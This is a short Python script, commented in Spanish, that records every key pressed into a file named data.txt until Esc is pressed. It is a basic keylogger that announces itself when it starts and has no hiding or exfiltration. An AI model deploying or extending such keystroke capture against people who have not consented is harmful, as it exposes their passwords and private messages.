
import keyboard

print("activado, presiona 'esc' para salir")

def pressedKeys(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
    
    if key.name == 'esc':
        print("Programa detenido.")
        keyboard.unhook_all() # Detener la escucha de todas las teclas
        exit()

keyboard.on_press(pressedKeys)
keyboard.wait()

